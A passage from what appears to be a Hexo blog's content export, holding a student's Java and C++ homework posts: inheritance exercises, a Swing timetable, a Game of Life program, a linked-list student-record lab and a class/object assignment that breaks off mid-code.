    int getArea()
    &#123;
        return (int)(radius*radius*3.1415926);
    &#125;
&#125;
4-3

abstract class Flyable &#123;
    void fly() &#123;

    &#125;
&#125;
abstract class Duck extends Flyable &#123;
    public void quack() &#123;
        System.out.println(&quot;我会呱呱呱&quot;);
    &#125;
    public void swim() &#123;
        System.out.println(&quot;我会游泳&quot;);
    &#125;
    public abstract void display();

    @Override
    public void fly() &#123;
        System.out.println(&quot;我会飞&quot;);
    &#125;
&#125;
class RedheadDuck extends Duck &#123;
    public void display() &#123;
        System.out.println(&quot;我是一只红头鸭&quot;);
    &#125;
&#125;

public class Main &#123;
    public static void main(String[] args) &#123;
        Duck rduck &#x3D; new RedheadDuck();
        rduck.display();
        rduck.quack();
        rduck.swim();
        rduck.fly();
    &#125;
&#125;
4-4
Foo
Foo.Bar
4-5
test run
Test$1
4-6
Shape.draw()1
4-7
抽象方法
抽象类
4-8
sealed


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Java 实现课程表</title>
    <url>/2020/11/16/java%20%E8%AF%BE%E7%A8%8B%E8%A1%A8/</url>
    <content><![CDATA[<p>Java 课程表</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">package test;

import javax.swing.*;
import javax.swing.event.TableModelListener;
import javax.swing.table.TableModel;

class KCBData implements TableModel &#123;
	private String[] title&#x3D; &#123;
	&quot;周一&quot;,&quot;周二&quot;,&quot;周三&quot;,&quot;周四&quot;,&quot;周五&quot;,&quot;周六&quot;,&quot;周日&quot;
	&#125;;
	private String[][]data&#x3D;new String[8][7];
	public KCBData()
	&#123;
		for(int i&#x3D;0;i&lt;data.length;i++)
			for(int j&#x3D;0;j&lt;data[i].length;j++)
			&#123;
				data[i][j]&#x3D;&quot;&quot;;
			&#125;
	&#125;
		
	@Override
	public void addTableModelListener(TableModelListener arg0) &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub

	&#125;

	@Override
	public Class&lt;?&gt; getColumnClass(int arg0) &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub
		return String.class;
	&#125;

	@Override
	public int getColumnCount() &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub
		return 7;
	&#125;

	@Override
	public String getColumnName(int arg0) &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub
		return title[arg0];
	&#125;

	@Override
	public int getRowCount() &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub
		return 8;
	&#125;

	@Override
	public Object getValueAt(int arg0, int arg1) &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub
		return data[arg0][arg1];
	&#125;

	@Override
	public boolean isCellEditable(int arg0, int arg1) &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub
		return true;
	&#125;

	@Override
	public void removeTableModelListener(TableModelListener arg0) &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub

	&#125;

	@Override
	public void setValueAt(Object arg0, int arg1, int arg2) &#123;
		&#x2F;&#x2F; TODO Auto-generated method stub
		data[arg1][arg2]&#x3D;(String)arg0;
	&#125;

&#125;
public class KCB
&#123;
    public static void main(String []args)
    &#123;
        JFrame frame&#x3D;new JFrame();
        JTable table&#x3D;new JTable(new KCBData());
        JScrollPane pane&#x3D;new JScrollPane(table);
        frame.add(pane);
        frame.pack();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);
        
    &#125;
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>Java 自动细胞机</title>
    <url>/2020/11/16/Java-%E8%87%AA%E5%8A%A8%E7%BB%86%E8%83%9E%E6%9C%BA/</url>
    <content><![CDATA[<p>Java 自动细胞机</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">
import javax.print.attribute.standard.NumberUp;
import javax.swing.*;
import java.awt.*;
import java.util.ArrayList;
import java.lang.Thread;
class View extends JPanel
&#123;
    private static final long serialVersionUID&#x3D;-313123123123L;
    private static final int GRID_SIZE&#x3D;16;
    private Field theField;
    public View(Field field)
    &#123;
        theField&#x3D;field;
    &#125;
    @Override
    public void paint(Graphics g)
    &#123;
        super.paint(g);
        for(int row&#x3D;0;row&lt;theField.getHeight();row++)
            for(int col&#x3D;0;col&lt;theField.getWidth();col++)
            &#123;
                Cell cell&#x3D;theField.get(row,col);
                if(cell!&#x3D; null)
                    cell.draw(g,col*GRID_SIZE,row*GRID_SIZE,GRID_SIZE);
            &#125;
    &#125;
    @Override
    public Dimension getPreferredSize()
    &#123;
        return new Dimension(theField.getWidth()*GRID_SIZE+1,theField.getHeight()*GRID_SIZE+1);
    &#125;
&#125;

class Cell
&#123;
    private boolean alive&#x3D;false;
    public void die()
    &#123;
        alive&#x3D;false;
    &#125;
    public void reborn()
    &#123;
        alive&#x3D;true;
    &#125;
    public boolean isAlive()
    &#123;
        return alive;
    &#125;
    public void draw(Graphics g,int x,int y,int size)
    &#123;
        g.drawRect(x,y,size,size);
        if(alive)
        &#123;
            g.fillRect(x,y,size,size);
        &#125;
    &#125;
&#125;

class Field
&#123;
    private int height;
    private int width;
    private Cell[][] field;
    public Field(int width,int height)
    &#123;
        this.width&#x3D;width;
        this.height&#x3D;height;
        field&#x3D;new Cell[height][width];
    &#125;
    public int getWidth()&#123;return width;&#125;
    public int getHeight()&#123;return height;&#125;
    public Cell place(int row,int col,Cell o)
    &#123;
        Cell ret&#x3D;field[row][col];
        field[row][col]&#x3D;o;
        return ret;
    &#125;
    public Cell get(int row ,int col)
    &#123;
        return field[row][col];
    &#125;
    public Cell[] getNeighbour(int row,int col)
    &#123;
        ArrayList&lt;Cell&gt; list&#x3D;new ArrayList&lt;Cell&gt;();
        for(int i&#x3D;-1;i&lt;2;i++)
        &#123;
            for(int j&#x3D;-1;j&lt;2;j++)
            &#123;
                int r&#x3D;row+i;
                int c&#x3D;col+j;
                if(r&gt;-1&amp;&amp;r&lt;height&amp;&amp;c&gt;-1&amp;&amp;c&lt;width&amp;&amp;!(r&#x3D;&#x3D;row&amp;&amp;c&#x3D;&#x3D;col))
                    list.add(field[r][c]);
            &#125;
        &#125;
        return list.toArray(new Cell[list.size()]);
    &#125;
&#125;



public class CellMachine
&#123;
    public static void main(String[] args)
    &#123;
        Field field&#x3D;new Field(30,30);
        for(int row&#x3D;0;row&lt;field.getHeight();row++)
        &#123;
            for(int col&#x3D;0;col&lt;field.getHeight();col++)
            &#123;
                field.place(row,col,new Cell());
            &#125;
        &#125;
        for(int row&#x3D;0;row&lt;field.getHeight();row++)
        &#123;
            for(int col&#x3D;0;col&lt;field.getHeight();col++)
            &#123;
                Cell cell&#x3D;field.get(row,col);
                if(Math.random()&lt;0.2)
                    cell.reborn();
            &#125;
        &#125;
        View view&#x3D;new View(field);
        JFrame frame&#x3D;new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setResizable(false);
        frame.setTitle(&quot;Cells&quot;);
        frame.add(view);
        frame.pack();
        frame.setVisible(true);
    for(int i&#x3D;0;i&lt;1000;i++)
    &#123;
        for(int row&#x3D;0;row&lt;field.getHeight();row++)
        &#123;
            for(int col&#x3D;0;col&lt;field.getWidth();col++)
            &#123;
                Cell cell&#x3D;field.get(row,col);
                Cell[]neighbour&#x3D;field.getNeighbour(row,col);
                int numOfLive&#x3D;0;
                for(Cell c:neighbour)
                &#123;
                    if(c.isAlive())
                        numOfLive++;
                &#125;
                System.out.print(&quot;[&quot;+row+&quot;][&quot;+col+&quot;]:&quot;);
                System.out.print(cell.isAlive()?&quot;live&quot;:&quot;dead&quot;);
                System.out.print(&quot;:&quot;+numOfLive+&quot;--&gt;&quot;);
                if(cell.isAlive())
                &#123;
                    if (numOfLive &lt; 2 || numOfLive &gt; 3) &#123;
                        cell.die();
                        System.out.print(&quot;die&quot;);
                    &#125;
                &#125;
                    else if(numOfLive&#x3D;&#x3D;3)
                    &#123;
                        cell.reborn();
                        System.out.print(&quot;reborn&quot;);
                    &#125;
                    System.out.println();
                &#125;
            &#125;
        System.out.println(&quot;UPDATA&quot;);
        frame.repaint();
        try
        &#123;
            Thread.sleep(80);
        &#125;
        catch (InterruptedException e)
        &#123;
            e.printStackTrace();
        &#125;

    &#125;


    &#125;
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>One more thing...</title>
    <url>/2020/11/12/One-more-thing/</url>
    <content><![CDATA[<p>One more thing…</p>
<a id="more"></a>
<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
    <iframe src="//player.bilibili.com/player.html?aid=202723997&bvid=BV1ra411c7B1&cid=254868805&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe>
</div>
<iframe width="560" height="315" src="https://www.youtube.com/embed/tk7r7G6k5CM" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>]]></content>
  </entry>
  <entry>
    <title>数据结构 实验1</title>
    <url>/2020/11/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C1/</url>
    <content><![CDATA[<p>数据结构 实验1</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;

using namespace std;
typedef struct STU
&#123;
    &#x2F;&#x2F; char name[20];
    &#x2F;&#x2F; char sno[20];
    &#x2F;&#x2F; int age;
    &#x2F;&#x2F; float score;
    char xuehao[100];
    char xingming[100];
    char xingbie[100];
    char zhuanye[100];
    char shengri[100];
&#125; Student;

typedef struct LNode
&#123;
    Student data;
    struct LNode *next;
&#125; LNode, *LinkList;

&#x2F;&#x2F;初始化(带头结点的单链表)
int InitList(LinkList &amp;L)
&#123;
    L &#x3D; new LNode;
    L-&gt;next &#x3D; NULL;
    return 1;
&#125;

&#x2F;&#x2F;判断链表是否为空
int ListEmpty(LinkList L)
&#123;
    if (L-&gt;next &#x3D;&#x3D; NULL)
    &#123;
        return 1; &#x2F;&#x2F; 链表为空
    &#125;
    else
    &#123;
        return 0; &#x2F;&#x2F;链表非空
    &#125;
&#125;

&#x2F;&#x2F;获取链表长度
int ListLength(LinkList L)
&#123;
    int length &#x3D; 0;
    LNode *p;
    p &#x3D; L-&gt;next;

    while (p)
    &#123;
        p &#x3D; p-&gt;next;
        length++;
    &#125;

    return length;
&#125;

&#x2F;&#x2F;遍历链表
void TraveList(LinkList L)
&#123;
    LNode *p;
    p &#x3D; L-&gt;next;

    printf(&quot;链表结构如下:\n&quot;);
    while (p)
    &#123;
        printf(&quot;%s %s %s %s %s&quot;, p-&gt;data.xuehao, p-&gt;data.xingming, p-&gt;data.xingbie, p-&gt;data.zhuanye, p-&gt;data.shengri);
        printf(&quot;\n&quot;);
        p &#x3D; p-&gt;next;
    &#125;
&#125;

&#x2F;&#x2F;插入操作
int ListInsert(LinkList &amp;L, int location, Student &amp;e)
&#123;
    &#x2F;&#x2F;在链表L的location位置插入元素e
    LNode *p;
    int j &#x3D; 0;
    p &#x3D; L;

    while (p &amp;&amp; j &lt; location - 1)
    &#123;
        p &#x3D; p-&gt;next;
        j++;
    &#125;
    if (!p || j &gt; location - 1)
    &#123;
        return 0;
    &#125;

    LNode *s;
    s &#x3D; new LNode;
    s-&gt;data &#x3D; e;
    s-&gt;next &#x3D; p-&gt;next;
    p-&gt;next &#x3D; s;

    return 1;
&#125;

&#x2F;&#x2F;删除操作
int ListDelete(LinkList &amp;L, int location, Student &amp;e)
&#123;
    &#x2F;&#x2F;删除L中location位置的元素，并用e返回其值
    LNode *p;
    int j &#x3D; 0;
    p &#x3D; L;

    while (p-&gt;next &amp;&amp; j &lt; location - 1)
    &#123;
        p &#x3D; p-&gt;next;
        j++;
    &#125;
    if (!(p-&gt;next) || j &gt; location - 1)
    &#123;
        return 0;
    &#125;

    LNode *q;
    q &#x3D; p-&gt;next;
    p-&gt;next &#x3D; q-&gt;next;
    e &#x3D; q-&gt;data;
    delete q;
    return 1;
&#125;
int ListChange(LinkList &amp;L, int location)
&#123;

    LNode *p;
    int j &#x3D; 0;
    p &#x3D; L;

    while (p-&gt;next &amp;&amp; j &lt; location)
    &#123;
        p &#x3D; p-&gt;next;
        j++;
    &#125;
    if ( j &gt; location)
    &#123;
        return 0;
    &#125;
    printf(&quot;请输入学号:&quot;);
    scanf(&quot;%s&quot;, p-&gt;data.xuehao);
    printf(&quot;请输入姓名:&quot;);
    scanf(&quot;%s&quot;, p-&gt;data.xingming);
    printf(&quot;请输入性别:&quot;);
    scanf(&quot;%s&quot;, p-&gt;data.xingbie);
    printf(&quot;请输入专业:&quot;);
    scanf(&quot;%s&quot;, p-&gt;data.zhuanye);
    printf(&quot;请输入出生年月:&quot;);
    scanf(&quot;%s&quot;, p-&gt;data.shengri);
    return 1;
&#125;


&#x2F;&#x2F; 尾插法创建单链表
void CreateList2(LinkList &amp;L, int n)
&#123;
    L &#x3D; new LNode;
    L-&gt;next &#x3D; NULL;
    LNode *r;
    r &#x3D; L;

    printf(&quot;请输入链表元素值:\n&quot;);
    for (int i &#x3D; 0; i &lt; n; i++)
    &#123;
        LNode *p;
        p &#x3D; new LNode;
        printf(&quot;请输入第%d个元素的值:\n&quot;, i + 1);
        printf(&quot;请输入学号:&quot;);
        scanf(&quot;%s&quot;, p-&gt;data.xuehao);
        printf(&quot;请输入姓名:&quot;);
        scanf(&quot;%s&quot;, p-&gt;data.xingming);
        printf(&quot;请输入性别:&quot;);
        scanf(&quot;%s&quot;, &amp;p-&gt;data.xingbie);
        printf(&quot;请输入专业:&quot;);
        scanf(&quot;%s&quot;, &amp;p-&gt;data.zhuanye);
        printf(&quot;请输入出生年月:&quot;);
        scanf(&quot;%s&quot;, &amp;p-&gt;data.shengri);

        p-&gt;next &#x3D; NULL;
        r-&gt;next &#x3D; p;
        r &#x3D; p;
    &#125;
&#125;
int main()
&#123;
    LinkList L;

    int choose &#x3D; -1;
    if (InitList(L))
    &#123;
        printf(&quot;链表初始化成功!\n&quot;);
    &#125;
    else
    &#123;
        printf(&quot;链表初始化失败!\n&quot;);
    &#125;
    while (choose !&#x3D; 0)
    &#123;
        printf(&quot;1.建立\n&quot;);
        printf(&quot;2.插入\n&quot;);
        printf(&quot;3.删除\n&quot;);
        printf(&quot;4.查询\n&quot;);
        printf(&quot;5.修改\n&quot;);
        printf(&quot;0.退出\n&quot;);
        printf(&quot;请选择操作:\n&quot;);
        scanf(&quot;%d&quot;, &amp;choose);
        switch (choose)
        &#123;
        case 1:
        &#123;

            printf(&quot;请输入链表长度:\n&quot;);
            int n;
            scanf(&quot;%d&quot;, &amp;n);
            CreateList2(L, n);
            TraveList(L);
            break;
        &#125;
        case 2:
        &#123;
            printf(&quot;请输入插入的位置:\n&quot;);
            int location;
            scanf(&quot;%d&quot;, &amp;location);

            Student stu;
            printf(&quot;请输入学号:&quot;);
            scanf(&quot;%s&quot;, stu.xuehao);
            printf(&quot;请输入姓名:&quot;);
            scanf(&quot;%s&quot;, stu.xingming);
            printf(&quot;请输入性别:&quot;);
            scanf(&quot;%s&quot;, &amp;stu.xingbie);
            printf(&quot;请输入专业:&quot;);
            scanf(&quot;%s&quot;, &amp;stu.zhuanye);
            printf(&quot;请输入出生年月:&quot;);
            scanf(&quot;%s&quot;, &amp;stu.shengri);

            if (ListInsert(L, location, stu))
            &#123;
                printf(&quot;插入成功!\n&quot;);
                TraveList(L);
            &#125;
            else
            &#123;
                printf(&quot;插入失败!\n&quot;);
            &#125;
            &#x2F;&#x2F;TraveList(L);
            break;
        &#125;
        case 3:
        &#123;
            printf(&quot;请输入要删除的元素的位置:\n&quot;);
            int location;
            scanf(&quot;%d&quot;, &amp;location);

            Student stu;

            if (ListDelete(L, location, stu))
            &#123;
                printf(&quot;删除成功!\n&quot;);
                printf(&quot;删除的元素值是:\n&quot;);
                printf(&quot;%s %s %s %s %s\n&quot;, stu.xuehao, stu.xingming, stu.xingbie, stu.zhuanye, stu.shengri);
                TraveList(L);
            &#125;
            else
            &#123;
                printf(&quot;删除失败!\n&quot;);
            &#125;
            break;
        &#125;
        case 4:
        &#123;
            TraveList(L);
            break;
        &#125;
        case 5:
        &#123;
            printf(&quot;请输入修改的位置:\n&quot;);
            int location;
            scanf(&quot;%d&quot;, &amp;location);
            
            if (ListChange(L, location))
                printf(&quot;修改成功！&quot;);
            else
                printf(&quot;修改失败！&quot;);
            
            TraveList(L);
            break;
        &#125;
        &#125;
    &#125;

    system(&quot;pause&quot;);
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>204实验</title>
    <url>/2020/11/09/204%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7f4d5cf9772f247a342165ea60da5494f2de9ef907c2990a6ba1b806ea11570d">bae23f33c097dc75a2ec7e0201b03554c2691bd44606a351b90deb31cd8faa404b4c249b9f76e0ee064c5ce27ff0f9974739c16ba7d654aee4bd7af8ab80d8e63a6e7b3cb075062b23f7f20a8c0566b3dc5084229290f9e2cd9b4ff8de0badc3c8ad002865978d5a0fc1c1263688a745f7fe1bdbf377866e12904ed26d31b8d2852cb28ac974f039bf22856381d7886744bfae8c36d50711670a405182eef8fa2bdcd60c74b80adf49db369351e1f049f2bb329b51f1382f90b1c2a5596ed9bb42f77cbf04c44432b15eb83c9bc3ac1a813e10b9355d1ef0b041c9825f6122c15b9f6205241d49aed7892e858fe753ce2a840529c477029441c7e0c38fc9c9199d8628c96ba70275748a24fa2ed72e3b9973d53b2fe7185afadca510118750ba1c450cf6dbc9d1665d7c8605c35621da8d93dd07de2fa8c2d16732a96ab8f0e4177452be13665ad8e6ef3e57c54f4172dfd4f80696d0dd58d82863267541a6661542cce9fbe05b34ca1b9629d7fa11fa2add8cb7177c19b4525b113320494590b95107dfc43530c6b6fb7add088ab66d9d8f5f8e38f2df9a4ab9c42142e61207dee0d6caa7d14f357b39d4f3643179155da9201cf220c2b64ecd7714f6523297817dfa53b1c6ea9748f136030cc30cfd76b2fc5ce2c8724fe18cfb948f19cdaffed4b27694580727c6e5c4bda8cf4754b3d0ed840df14328e5226cfeb87fe2a256e6ff01bbee7d2b2b4004d30a4829ca2103ce0459f5127435e25864a252a8006e97c1852833228c22fcad9a8c57778b</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>作业2——类的继承与多态</title>
    <url>/2020/11/06/%E4%BD%9C%E4%B8%9A2%E2%80%94%E2%80%94%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81/</url>
    <content><![CDATA[<p>作业2——类的继承与多态</p>
<a id="more"></a>
<p><img src="/photo/%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81.png" alt="矩阵"><br><img src="/photo/%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%812.png" alt="矩阵"></p>
]]></content>
  </entry>
  <entry>
    <title>JAVA 作业1：类和对象</title>
    <url>/2020/10/24/java-%E4%BD%9C%E4%B8%9A1%EF%BC%9A%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p>作业1：类和对象</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">5-1
题目要求:

1.使用this调用已有的有参构造函数，width与length分别为5和6。

2.为Rectangle类覆盖toString。按照width&#x3D;实际宽度值,length&#x3D;实际长度值的格式输出

public Rectangle()&#123;
     
this.width&#x3D;5;this.length&#x3D;6;
    
&#125;
public Rectangle(int width, int length) &#123;
    this.width &#x3D; width;
    this.length &#x3D; length;
&#125;
public 
String toString()
&#123;
     
return &quot;width&#x3D;&quot;+this.width+&quot;,length&#x3D;&quot;+this.length;

&#125;    

5-2
要求：根据Main类中main方法中的代码，设计满足要求的Student（学生）类：1）包含属性：int no（学号）、String name（姓名）；2）满足Main类中main方法代码的说明要求。 Main类中main方法代码的说明：1）首先，从键盘接收形如“3 cuizhenyu 2 tiangang 1 dingchangqing 4 zhangfeng”的字符串，该字符串中包含了4个学生的学号和姓名（各学生以及学生的学号和姓名之间都用一个空格分隔，姓名中只包含英文字母），然后将该字符串内容中的前3个学生的学号及其姓名放到到Student数组stus中；2）将stus中的3个Student放入到HashSet stuSet中（注意：如果学生的学号相同，则认为是相同对象，不放入stuSet中）；3）将第4个学生对象放入到stuSet中，如果第4个学生对象的学号与stuSet中已有学生对象的学号相同则不能放入。然后，打印出当前stuSet中学生对象的个数；4）用Arrays.sort方法对数组stus按照学生姓名的字母顺序排序（先比较首字母，首字母相同的比较第二个字母，以此类推），输出排序后的stus中3个学生对象的内容，每个学生对象的输出格式为“no&#x3D;XX&amp;name&#x3D;YY”。

import java.util.Arrays;
import java.util.HashSet;
import java.util.Scanner;
class Student implements Comparable&#123;


    private int no;
    private String name;

    public Student(int no, String name) &#123;
        this.name&#x3D;name;
        this.no&#x3D;no;
    &#125;



    public String toString() &#123;
        return &quot;no&#x3D;&quot;+this.no+&quot;&amp;name&#x3D;&quot;+this.name;
    &#125;


    public boolean equals(Object o) &#123;
        if (o&#x3D;&#x3D;null) return false;
        else &#123;
            boolean result&#x3D;false;
            if (o instanceof Student) &#123;
                Student otherstu&#x3D;(Student)o;
                if (this.no&#x3D;&#x3D;otherstu.no)
                    result&#x3D;true;
            &#125;
            return result;
        &#125;
    &#125;



    public int compareTo(Object arg0) &#123;

        Student otherstu&#x3D;(Student)arg0;
        if (this.no&lt;otherstu.no)return -1;
        else if (this.no&gt;otherstu.no)return 1;
        else return 0;

    &#125;
&#125;




public class Main&#123;
    public static void main(String[] args) &#123;
        Scanner scan &#x3D; new Scanner(System.in);
        Student[] stus &#x3D; new Student[3];

        for(int i&#x3D;0;i&lt;3;i++)&#123;
            int no &#x3D; scan.nextInt();
            String name &#x3D; scan.next();
            Student s &#x3D; new Student(no,name);
            stus[i] &#x3D;s;
        &#125;
        &#x2F;&#x2F;将stus中的3个学生对象，放入到HashSet中
        HashSet&lt;Student&gt; stuSet &#x3D; new HashSet&lt;Student&gt;();
        for(Student s: stus)&#123;
            stuSet.add(s);
        &#125;
        &#x2F;&#x2F;要放入的第4个Student
        Student fourth &#x3D; new Student(scan.nextInt(),scan.next());
        stuSet.add(fourth);&#x2F;&#x2F;如果fourth的学号（no）与stuSet中的已有学生的no重复则无法放入
        System.out.println(stuSet.size());

        Arrays.sort(stus);&#x2F;&#x2F;对stus中的3个原有对象，按照姓名首字符有小到大排序
        for(int i&#x3D;0;i&lt;stus.length;i++)&#123;
            System.out.println(stus[i]);&#x2F;&#x2F;输出的格式为：no&#x3D;XX&amp;name&#x3D;YY
        &#125;

        scan.close();
    &#125;
&#125;

5-3
以下程序的功能是求一个二维数组中每行的最大值和每行的和。

输入样例
3 
1 2 3 
6 5 4 
7 9 8
输出样例
1  2  3  3  6
6  5  4  6 15
7  9  8  9 24
import java.util.Scanner;

public class Main &#123;

    public static void main(String[] args) &#123;
        Scanner sc&#x3D;new Scanner(
System.in
);
        int n&#x3D;sc.nextInt();
        int a[][]&#x3D;new int[n][n];
        int b[]&#x3D;new int[n];
        int c[]&#x3D;new int[n];
        for(int i&#x3D;0;i&lt;a.length;i++)&#123;
            for(int j&#x3D;0;j&lt;
a[i].length
;j++)&#123;
                a[i][j]&#x3D;sc.nextInt();
            &#125;
        &#125;        
        int max,s;
        for(int i&#x3D;0;i&lt;a.length;i++)&#123;
            max&#x3D;a[i][0];
            
s&#x3D;0
;
